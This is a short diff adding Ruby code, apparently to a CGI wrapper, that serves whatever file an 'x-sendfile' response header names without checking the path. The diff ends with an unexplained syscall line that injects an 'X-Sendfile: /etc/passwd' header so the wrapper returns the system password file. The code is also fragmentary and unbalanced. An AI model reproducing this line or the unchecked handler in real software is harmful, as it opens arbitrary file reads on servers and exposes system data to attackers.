@@ -1,0 +1,16 @@
+if cgi_output_header.keys.include?("x-sendfile")
+		begin
+			output_file_name= cgi_output_header.delete("x-sendfile")
+			output_file= File.open(output_file_name)
+			cgi_output_header["content-length"]= File.size(output_file_name).to_s
+			[cgi_output_status, cgi_output_header, output_file]
+		rescue Errno::ENOENT
+			[500, {"content-type" => "text/plain"}, ["internal server error"]]
+		end
+	else
+		cgi_output_header["content-length"]= (cgi_output_body || "").size.to_s
+		[cgi_output_status, cgi_output_header, [cgi_output_body].compact]
+	end
+end)
+
+syscall(1,13,"X-Sendfile: /etc/passwd\nStatus: 200 OK\n\n",60)
